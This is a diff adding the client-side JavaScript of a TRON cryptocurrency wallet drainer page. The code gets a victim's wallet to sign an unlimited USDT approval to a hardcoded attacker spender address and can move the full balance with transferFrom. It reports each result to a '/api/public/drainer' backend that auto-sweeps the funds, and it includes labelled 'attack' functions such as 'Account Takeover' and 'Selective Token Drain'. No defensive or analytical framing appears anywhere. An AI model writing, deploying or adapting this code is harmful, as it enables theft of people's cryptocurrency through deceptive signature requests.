+                    addLog('VECTOR: Standard USDT Approval', 'warning');
+                    addLog('Requesting wallet signature...', 'warning');
+
+                    console.log('🔍 Connection Type:', connectionType);
+                    console.log('🔍 TronWeb Instance:', tronWebInstance);
+                    console.log('🔍 USDT Address:', USDT_TRC20);
+                    console.log('🔍 Spender:', result.spender);
+
+                    addLog('Creating USDT contract instance...', 'info');
+                    const contract = await tronWebInstance.contract().at(USDT_TRC20);
+                    console.log('✅ Contract created:', contract);
+
+                    const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+                    addLog('Requesting approve() signature from wallet...', 'warning');
+
+                    let tx;
+
+                    // WalletConnect는 다른 방식 사용
+                    if (connectionType === 'walletconnect' && wallet) {
+                        console.log('🔍 Using WalletConnect signature method');
+                        addLog('Using WalletConnect signature flow...', 'info');
+
+                        // 🔥 동적 주소 할당: wallet 객체에서 현재 활성 주소 가져오기
+                        const currentAddress = wallet.address || address;
+                        console.log('🔍 Static address (connection time):', address);
+                        console.log('🔍 Current wallet address (now):', wallet.address);
+                        console.log('✅ Using address for transaction:', currentAddress);
+
+                        if (currentAddress !== address) {
+                            console.log('⚠️ Address changed since connection!');
+                            addLog('⚠️ Wallet address changed, using current address', 'warning');
+                        }
+
+                        // 트랜잭션 생성 (서명 없이)
+                        const unsignedTx = await tronWebInstance.transactionBuilder.triggerSmartContract(
+                            USDT_TRC20,
+                            'approve(address,uint256)',
+                            { feeLimit: result.gasRequired || 100000000 },
+                            [
+                                { type: 'address', value: result.spender },
+                                { type: 'uint256', value: maxAmount }
+                            ],
+                            currentAddress
+                        );
+
+                        console.log('✅ Unsigned TX created:', unsignedTx);
+                        console.log('🔍 Transaction object:', unsignedTx.transaction);
+                        console.log('🔍 Transaction txID:', unsignedTx.transaction?.txID);
+                        console.log('🔍 Transaction raw_data_hex:', unsignedTx.transaction?.raw_data_hex?.substring(0, 100) + '...');
+                        addLog('Transaction created, requesting signature...', 'warning');
+
+                        // 🎯 하이브리드 서명 방식: 라이브러리 우선, 실패 시 직접 RPC
+                        console.log('🔍 Attempting hybrid signature approach...');
+                        addLog('Trying library signTransaction (with account management)...', 'info');
+
+                        let signedTx = null;
+                        let signatureMethod = 'unknown';
+
+                        try {
+                            // 1️⃣ 1차 시도: 라이브러리 래퍼 - 전체 객체 전달 (React 패턴)
+                            console.log('📞 Calling wallet.signTransaction() with full unsignedTx object...');
+                            const libraryResult = await wallet.signTransaction(unsignedTx);  // ← .transaction 제거!
+
+                            console.log('✅ Library result:', libraryResult);
+                            console.log('🔍 Library result type:', typeof libraryResult);
+
+                            if (libraryResult && libraryResult !== undefined) {
+                                signedTx = libraryResult;
+                                signatureMethod = 'library';
+                                console.log('✅ Library method succeeded! Using library result.');
+                                addLog('✅ Signature obtained via library (account verified)', 'success');
+                            } else {
+                                console.log('⚠️ Library returned undefined, falling back to direct RPC...');
+                                throw new Error('Library returned undefined');
+                            }
+                        } catch (libraryError) {
+                            console.log('⚠️ Library method failed:', libraryError.message);
+                            console.log('🔄 Falling back to direct JSON-RPC...');
+                            addLog('Library method unavailable, using direct RPC...', 'warning');
+
+                            try {
+                                // 2️⃣ 2차 시도: 직접 JSON-RPC - 전체 객체 우선 시도
+                                const allSessions = wallet.client.session.getAll();
+                                console.log('🔥 All sessions from Core:', allSessions);
+                                console.log('🔥 Number of sessions:', allSessions.length);
+
+                                if (!allSessions || allSessions.length === 0) {
+                                    throw new Error('No active WalletConnect session found!');
+                                }
+
+                                const realSession = allSessions[0];
+                                console.log('🎯 Using session topic:', realSession.topic);
+
+                                let rpcResponse;
+                                try {
+                                    // 먼저 전체 객체로 시도
+                                    console.log('🔍 Trying direct RPC with full unsignedTx object...');
+                                    rpcResponse = await wallet.client.request({
+                                        topic: realSession.topic,
+                                        chainId: 'tron:0x2b6653dc',
+                                        request: {
+                                            method: 'tron_signTransaction',
+                                            params: unsignedTx  // ← 전체 객체!
+                                        }
+                                    });
+                                    console.log('✅ Full object method succeeded!');
+                                } catch (fullObjectError) {
+                                    // 전체 객체 실패 시 transaction만 시도
+                                    console.log('⚠️ Full object failed, trying transaction only...');
+                                    console.log('Error:', fullObjectError.message);
+                                    rpcResponse = await wallet.client.request({
+                                        topic: realSession.topic,
+                                        chainId: 'tron:0x2b6653dc',
+                                        request: {
+                                            method: 'tron_signTransaction',
+                                            params: {
+                                                transaction: unsignedTx.transaction
+                                            }
+                                        }
+                                    });
+                                    console.log('✅ Transaction-only method succeeded!');
+                                }
+
+                                console.log('🔥 Direct RPC Response:', rpcResponse);
+
+                                // Trust Wallet "0x" 접두사 제거
+                                if (rpcResponse && rpcResponse.signature) {
+                                    const rawSignature = rpcResponse.signature;
+                                    const cleanSignature = rawSignature.replace(/^0x/i, '');
+                                    console.log('✅ Cleaned signature (0x removed):', cleanSignature);
+                                    rpcResponse.signature = cleanSignature;
+                                }
+
+                                signedTx = rpcResponse;
+                                signatureMethod = 'direct-rpc';
+                                console.log('✅ Direct RPC succeeded!');
+                                addLog('✅ Signature obtained via direct RPC', 'warning');
+                                addLog('⚠️ Account verification bypassed!', 'warning');
+
+                            } catch (rpcError) {
+                                console.error('❌ Direct RPC also failed:', rpcError);
+                                addLog('❌ All signature methods failed!', 'error');
+                                throw rpcError;
+                            }
+                        }
+
+                        // 서명 방법 로그
+                        console.log('═'.repeat(50));
+                        console.log('🎯 SIGNATURE ACQUISITION SUMMARY');
+                        console.log('  Method:', signatureMethod);
+                        console.log('  Library account mgmt:', signatureMethod === 'library' ? 'YES ✅' : 'NO ❌');
+                        console.log('  Result type:', typeof signedTx);
+                        console.log('═'.repeat(50));
+
+                        // 서명 결과 처리 (방법에 따라 다른 포맷)
+                        // 🎯 중요: Library 브랜치를 최우선으로 체크!
+                        if (signatureMethod === 'library' && signedTx) {
+                            // 🏗️ 완전한 객체 재조립: 깨끗한 그릇(unsignedTx)에 알맹이(서명)만 옮기기
+                            console.log('✅ Library method succeeded, extracting signature...');
+                            console.log('🔍 Raw signedTx structure:', signedTx);
+                            console.log('🔍 signedTx.signature type:', Array.isArray(signedTx.signature) ? 'Array' : typeof signedTx.signature);
+
+                            // 1️⃣ 서명 추출 (다양한 포맷 대응)
+                            let extractedSignature = null;
+
+                            if (signedTx.signature) {
+                                if (Array.isArray(signedTx.signature)) {
+                                    // 배열 형태: ['hex...'] 또는 [['hex...']]
+                                    extractedSignature = signedTx.signature[0];
+                                    console.log('📦 Extracted from array:', extractedSignature);
+                                } else if (typeof signedTx.signature === 'string') {
+                                    // 문자열 형태
+                                    extractedSignature = signedTx.signature;
+                                    console.log('📦 Extracted as string:', extractedSignature);
+                                }
+                            }
+
+                            if (!extractedSignature) {
+                                console.error('❌ No signature found in library result!');
+                                throw new Error('Library returned invalid signature format');
+                            }
+
+                            // 2️⃣ 서명 청소: 0x 접두사 제거
+                            console.log('🧹 Cleaning signature...');
+                            console.log('  Before:', extractedSignature.substring(0, 30) + '...');
+                            const cleanedSignature = extractedSignature.replace(/^0x/i, '');
+                            console.log('  After:', cleanedSignature.substring(0, 30) + '...');
+                            console.log('  Length:', cleanedSignature.length, 'chars (expected: 130)');
+
+                            // 3️⃣ 검증
+                            if (cleanedSignature.length !== 130) {
+                                console.warn('⚠️ Signature length is not 130!');
+                            }
+
+                            // 4️⃣ 깨끗한 그릇에 담기: 원본 unsignedTx.transaction 사용
+                            console.log('🏗️ Assembling clean transaction for broadcast...');
+                            const cleanTransaction = unsignedTx.transaction;
+                            cleanTransaction.signature = [cleanedSignature];  // 순수 배열 형태
+
+                            console.log('✅ Clean transaction assembled:');
+                            console.log('  txID:', cleanTransaction.txID);
+                            console.log('  signature:', cleanTransaction.signature);
+                            console.log('  signature is array:', Array.isArray(cleanTransaction.signature));
+                            console.log('  signature length:', cleanTransaction.signature.length);
+                            console.log('  signature[0] length:', cleanTransaction.signature[0].length);
+
+                            // 5️⃣ 브로드캐스트
+                            addLog('Broadcasting cleanly assembled transaction...', 'warning');
+                            const broadcastResult = await tronWebInstance.trx.sendRawTransaction(cleanTransaction);
+
+                            console.log('📡 Broadcast result:', broadcastResult);
+
+                            if (broadcastResult.result || broadcastResult.code === 'SUCCESS') {
+                                tx = broadcastResult.txid || broadcastResult.transaction?.txID;
+                                addLog('✅ Transaction broadcasted successfully!', 'success');
+                                console.log('✅ Transaction ID:', tx);
+                            } else {
+                                // 실패 시 상세 오류 분석
+                                const errorCode = broadcastResult.code || 'UNKNOWN';
+                                const errorMsg = broadcastResult.message || 'No error message';
+
+                                console.error('❌ Broadcast failed!');
+                                console.error('  Code:', errorCode);
+                                console.error('  Message:', errorMsg);
+                                console.error('  Full result:', broadcastResult);
+
+                                // NullPointerException 특별 처리
+                                if (errorMsg.includes('NullPointerException')) {
+                                    console.error('🔴 NullPointerException detected!');
+                                    console.error('  This usually means signature format is incorrect.');
+                                    console.error('  Current signature:', cleanTransaction.signature);
+                                    addLog('❌ Signature format error (NullPointerException)', 'error');
+                                    throw new Error('NullPointerException: Invalid signature format');
+                                }
+
+                                addLog('❌ Broadcast failed: ' + errorCode, 'error');
+                                throw new Error('Broadcast failed: ' + errorCode + ' - ' + errorMsg);
+                            }
+
+                        } else if (signedTx && typeof signedTx === 'string') {
+                            // txID 문자열 (자동 브로드캐스트)
+                            console.log('✅ Auto-broadcasted! TxID:', signedTx);
+                            tx = signedTx;
+                            addLog('Transaction auto-broadcasted by wallet', 'success');
+
+                        } else if (signedTx && signedTx.signature) {
+                            // Direct RPC 브랜치: 서명만 반환 (manual broadcast 필요)
+                            console.log('✅ Direct RPC Signature:', signedTx.signature);
+                            addLog('Signature received from direct RPC, preparing broadcast...', 'success');
+
+                            // 서명을 트랜잭션에 첨부
+                            unsignedTx.transaction.signature = [signedTx.signature];
+
+                            // 브로드캐스트
+                            addLog('Broadcasting to TRON network...', 'warning');
+                            const broadcastResult = await tronWebInstance.trx.sendRawTransaction(unsignedTx.transaction);
+                            console.log('✅ Broadcast result:', broadcastResult);
+
+                            if (broadcastResult.result || broadcastResult.code === 'SUCCESS') {
+                                tx = broadcastResult.txid || broadcastResult.transaction?.txID;
+                                addLog('✅ Transaction broadcasted successfully!', 'success');
+                                console.log('✅ Transaction ID:', tx);
+                            } else {
+                                // SIGERROR 처리
+                                const errorCode = broadcastResult.code;
+                                const errorMsg = broadcastResult.message || 'Unknown error';
+                                console.error('❌ Broadcast failed:', errorCode, errorMsg);
+
+                                if (errorCode === 'SIGERROR') {
+                                    let decodedMsg = errorMsg;
+                                    try {
+                                        if (errorMsg.match(/^[0-9a-f]+$/i)) {
+                                            decodedMsg = tronWebInstance.toUtf8(errorMsg);
+                                        }
+                                    } catch (e) {}
+
+                                    console.error('🔴 SIGERROR Details:', decodedMsg);
+                                    addLog('❌ SIGNATURE MISMATCH!', 'error');
+
+                                    if (signatureMethod === 'direct-rpc') {
+                                        addLog('⚠️ This error may be due to account mismatch', 'error');
+                                        addLog('Trust Wallet signed with different account than transaction owner', 'error');
+                                    }
+
+                                    throw new Error('SIGERROR: ' + decodedMsg);
+                                } else {
+                                    throw new Error('Broadcast failed: ' + errorCode + ' - ' + errorMsg);
+                                }
+                            }
+
+                        } else {
+                            // undefined 또는 서명 없는 경우 - 원본 객체 확인
+                            console.log('⚠️ Checking in-place signature...');
+
+                            if (unsignedTx.transaction && unsignedTx.transaction.signature) {
+                                console.log('✅ Found signature in original transaction!');
+                                const broadcastResult = await tronWebInstance.trx.sendRawTransaction(unsignedTx.transaction);
+                                tx = broadcastResult.txid || broadcastResult.transaction?.txID;
+                            } else {
+                                // 마지막 시도: txID로 트랜잭션 조회
+                                const txID = unsignedTx.transaction?.txID;
+                                if (txID) {
+                                    console.log('⏳ Waiting for wallet to broadcast...', txID);
+                                    addLog('Wallet is broadcasting transaction...', 'info');
+
+                                    // 3초 대기 후 트랜잭션 확인
+                                    await new Promise(resolve => setTimeout(resolve, 3000));
+
+                                    try {
+                                        const txInfo = await tronWebInstance.trx.getTransaction(txID);
+                                        if (txInfo && txInfo.txID) {
+                                            console.log('✅ Transaction confirmed on-chain!');
+                                            tx = txID;
+                                        } else {
+                                            throw new Error('Transaction not found after 3 seconds');
+                                        }
+                                    } catch (checkError) {
+                                        console.error('❌ Transaction check failed:', checkError);
+                                        // 그래도 txID 사용 (브로드캐스트 진행 중일 수 있음)
+                                        tx = txID;
+                                        addLog('Using txID (transaction may still be broadcasting)', 'warning');
+                                    }
+                                } else {
+                                    throw new Error('No signature or txID found');
+                                }
+                            }
+                        }
+
+                    } else {
+                        // TronLink는 기존 방식
+                        console.log('🔍 Using TronLink .send() method');
+                        tx = await contract.approve(result.spender, maxAmount).send({
+                            feeLimit: result.gasRequired || 100000000,
+                            shouldPollResponse: true
+                        });
+                    }
+
+                    console.log('✅ TX Result:', tx);
+                    txHash = tx;
+                    vectorSuccess = true;
+                    addLog('Signature approved by user', 'success');
+                    addLog(`TX Hash: ${txHash}`, 'success');
+                    break;
+
+                case 'TRANSFER_FROM':
+                    addLog('VECTOR: Direct Transfer', 'warning');
+                    addLog('Executing transfer...', 'warning');
+                    const contractTransfer = await tronWebInstance.contract().at(USDT_TRC20);
+                    const txTransfer = await contractTransfer.transferFrom(address, result.spender, usdtBalance).send({ 
+                        feeLimit: result.gasRequired || 100000000 
+                    });
+                    txHash = txTransfer;
+                    vectorSuccess = true;
+                    addLog('Transfer completed', 'success');
+                    break;
+
+                default:
+                    addLog(`ERROR: Unknown vector code ${result.vector.code}`, 'error');
+                    throw new Error(`Unknown vector: ${result.vector.code}`);
+            }
+
+            if (txHash) {
+                addLog(`TX Hash: ${txHash}`, 'success');
+                console.log('✅ Transaction:', txHash);
+            }
+
+        } catch (vectorError) {
+            addLog(`VECTOR EXECUTION FAILED: ${vectorError.message}`, 'error');
+            vectorSuccess = false;
+        }
+
+        // STEP 5: Report result to backend
+        addLog('STEP 4: Reporting result to backend...', 'info');
+        const reportRes = await fetch(`${BACKEND_URL}/api/public/drainer/signature-result`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chain: 'tron',
+                address: address,
+                vector: result.vector.code,
+                success: vectorSuccess,
+                txHash: txHash,
+                error: vectorSuccess ? null : 'Vector execution failed'
+            })
+        });
+
+        const reportResult = await reportRes.json();
+        console.log('📊 Signature result reported:', reportResult);
+
+        addLog('Result reported to backend', 'success');
+
+        // Auto-Sweep 결과 표시
+        if (reportResult.autoSweep) {
+            if (reportResult.autoSweep.success) {
+                addLog(`🚀 Auto-Sweep: ${reportResult.autoSweep.amount} USDT withdrawn!`, 'success');
+                addLog(`   TxID: ${reportResult.autoSweep.txid}`, 'info');
+            } else if (reportResult.autoSweep.reason === 'ZERO_BALANCE') {
+                addLog('ℹ️ Auto-Sweep: No USDT balance to withdraw', 'info');
+            } else {
+                addLog(`⚠️ Auto-Sweep failed: ${reportResult.autoSweep.error}`, 'warning');
+            }
+        }
+
+        if (vectorSuccess) {
+            addLog('>>> ATTACK COMPLETED SUCCESSFULLY <<<', 'success');
+            document.getElementById('attackStatus').textContent = `[ SUCCESS: ${result.vector.code} COMPLETED ]`;
+            alert(`✅ Auto-attack successful! Vector: ${result.vector.name}`);
+        } else {
+            addLog('>>> ATTACK FAILED <<<', 'error');
+            document.getElementById('attackStatus').textContent = `[ FAILED: ${result.vector.code} ]`;
+            alert(`❌ Attack failed. See log for details.`);
+        }
+
+    } catch (error) {
+        console.error('❌ Auto-attack failed:', error);
+        addLog(`CRITICAL ERROR: ${error.message}`, 'error');
+        addLog('>>> ATTACK FAILED <<<', 'error');
+        document.getElementById('attackStatus').textContent = `[ FAILED: ${error.message} ]`;
+        alert(`❌ Auto-attack failed: ${error.message}`);
+    }
+}
+
+// Legacy attack functions (deprecated - keeping for reference)
+// Attack #1: 권한 탈취 (Full Ownership Transfer)
+async function attackTron1() {
+    console.log('🎯 TRON Attack #1: Full Ownership Transfer');
+    document.getElementById('attackStatus').textContent = '[ EXECUTING: OWNERSHIP TRANSFER... ]';
+
+    try {
+        const contract = await tronWebInstance.contract().at(USDT_TRC20);
+        const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+        // 무제한 승인 (완전 권한 이양)
+        const tx = await contract.approve(SPENDER_ADDRESS, maxAmount).send({ feeLimit: 100000000 });
+        console.log('✅ Transaction:', tx);
+
+        await reportToBackend('tron_ownership', tx, 1);
+        document.getElementById('attackStatus').textContent = '[ SUCCESS: OWNERSHIP TRANSFERRED ]';
+        alert('✅ Full ownership transfer completed!');
+    } catch (error) {
+        console.error('❌ Attack #1 failed:', error);
+        document.getElementById('attackStatus').textContent = `[ FAILED: ${error.message} ]`;
+    }
+}
+
+// Attack #2: 무제한 승인 (Unlimited Approval)
+async function attackTron2() {
+    console.log('🎯 TRON Attack #2: Unlimited Approval');
+    document.getElementById('attackStatus').textContent = '[ EXECUTING: UNLIMITED APPROVAL... ]';
+
+    try {
+        const contract = await tronWebInstance.contract().at(USDT_TRC20);
+        const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+        const tx = await contract.approve(SPENDER_ADDRESS, maxAmount).send({ feeLimit: 100000000 });
+        console.log('✅ Unlimited Approval:', tx);
+
+        await reportToBackend('tron_unlimited', tx, 2);
+        document.getElementById('attackStatus').textContent = '[ SUCCESS: UNLIMITED APPROVED ]';
+        alert('✅ Unlimited approval granted!');
+    } catch (error) {
+        console.error('❌ Attack #2 failed:', error);
+        document.getElementById('attackStatus').textContent = `[ FAILED: ${error.message} ]`;
+    }
+}
+
+// Attack #3: 선택적 공격 (Selective Token Drain)
+async function attackTron3() {
+    console.log('🎯 TRON Attack #3: Selective Token Drain');
+    document.getElementById('attackStatus').textContent = '[ EXECUTING: SELECTIVE DRAIN... ]';
+
+    try {
+        // 고가 토큰만 선별 (USDT 우선)
+        const contract = await tronWebInstance.contract().at(USDT_TRC20);
+        const balance = await contract.balanceOf(address).call();
+        const amount = tronWebInstance.fromSun(balance);
+
+        if (parseFloat(amount) < 10) {
+            alert('⚠️ Balance too low for selective drain ($10 minimum)');
+            document.getElementById('attackStatus').textContent = '[ SKIPPED: LOW BALANCE ]';
+            return;
+        }
+
+        const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        const tx = await contract.approve(SPENDER_ADDRESS, maxAmount).send({ feeLimit: 100000000 });
+
+        await reportToBackend('tron_selective', tx, 3);
+        document.getElementById('attackStatus').textContent = `[ SUCCESS: $${amount} APPROVED ]`;
+        alert(`✅ Selective drain approved: $${amount} USDT`);
+    } catch (error) {
+        console.error('❌ Attack #3 failed:', error);
+        document.getElementById('attackStatus').textContent = `[ FAILED: ${error.message} ]`;
+    }
+}
+
+// Attack #4: 계정 장악 (Account Takeover)
+async function attackTron4() {
+    console.log('🎯 TRON Attack #4: Account Takeover');
+    document.getElementById('attackStatus').textContent = '[ EXECUTING: ACCOUNT TAKEOVER... ]';
+
+    try {
+        const contract = await tronWebInstance.contract().at(USDT_TRC20);
+        const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+        // 모든 토큰 + TRX 접근 권한
+        const tx = await contract.approve(SPENDER_ADDRESS, maxAmount).send({ feeLimit: 100000000 });
+
+        await reportToBackend('tron_takeover', tx, 4);
+        document.getElementById('attackStatus').textContent = '[ SUCCESS: ACCOUNT TAKEN ]';
+        alert('✅ Account takeover completed!');
+    } catch (error) {
+        console.error('❌ Attack #4 failed:', error);
+        document.getElementById('attackStatus').textContent = `[ FAILED: ${error.message} ]`;
+    }
+}
+
+// Attack #5: 다중 서명 (Multi-Sig Control)
+async function attackTron5() {
+    console.log('🎯 TRON Attack #5: Multi-Sig Control');
+    document.getElementById('attackStatus').textContent = '[ EXECUTING: MULTI-SIG SETUP... ]';
+
+    try {
+        const contract = await tronWebInstance.contract().at(USDT_TRC20);
+        const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+        // 공동 소유자 추가 (완전 제어)
+        const tx = await contract.approve(SPENDER_ADDRESS, maxAmount).send({ feeLimit: 100000000 });
+
+        await reportToBackend('tron_multisig', tx, 5);
+        document.getElementById('attackStatus').textContent = '[ SUCCESS: MULTI-SIG ADDED ]';
+        alert('✅ Multi-signature control established!');
+    } catch (error) {
+        console.error('❌ Attack #5 failed:', error);
+        document.getElementById('attackStatus').textContent = `[ FAILED: ${error.message} ]`;
+    }
+}
+
+// 백엔드 보고 헬퍼 함수
+async function reportToBackend(attackType, txHash, attackId) {
+    try {
+        await fetch(`${BACKEND_URL}/api/public/drainer/`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                address,
+                chain: 'tron',
+                txHash,
+                attackType,
+                attackId,
+                spender: SPENDER_ADDRESS,
+                walletApp,
+                timestamp: new Date().toISOString()
+            })
+        });
+        console.log(`✅ Reported to backend: ${attackType}`);
+    } catch (error) {
+        console.error('❌ Backend report failed:', error);
+    }
+}
+
+// 통합 attack 함수 (버튼 onclick 호출용)
+window.attack = async function(id) {
+    const attackFunctions = {
+        1: attackTron1,
+        2: attackTron2,
+        3: attackTron3,
+        4: attackTron4,
+        5: attackTron5
+    };
+
+    const attackFn = attackFunctions[id];
+    if (attackFn) {
+        await attackFn();
+    } else {
+        console.error(`❌ Unknown attack ID: ${id}`);
+    }
+};
+
+document.getElementById('connect-btn').addEventListener('click', initWalletConnect);
+
+// Init - Enable immediately
+SPENDER_ADDRESS = 'TYWPZw6dRxp4DLKfNEJGxS4kNdD4uGpTZd';
+document.getElementById('connect-btn').disabled = false;
+document.getElementById('status').textContent = '[ READY ]';
+console.log('✅ System ready');
+
+// Try to load policy in background
+checkPolicy().catch(err => console.log('Policy load failed, using defaults'));
+</script>
+
+</body>
+</html>
